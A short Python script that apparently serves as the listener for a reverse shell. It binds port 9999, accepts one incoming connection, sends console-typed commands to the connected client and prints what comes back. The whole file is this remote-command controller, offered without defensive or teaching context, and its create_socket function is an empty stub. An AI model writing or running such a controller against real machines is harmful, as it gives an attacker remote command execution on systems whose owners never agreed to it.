import socket
import sys
host = ''
port=9999
s = socket.socket()

def create_socket():
    try:
        global host
        global port 
        global s
        
    except socket.error as msg:
        print('Socket error'+ str(msg))

#binds socket and inits listener
def bind_socket():
    try:
        global host
        global port 
        global s

        print('binding to port => ' + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print('Socket binding error ' + str(msg) + '\n' + 'Retrying..')
        bind_socket()

#connect with client(wont work unless socket listening)

def socket_accept():
    conn, address = s.accept()
    print('Connection established'+ 'ip='+address[0]+' | port='+str(address[1]))
    send_command(conn)  
    conn.close()

#send command to connection
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()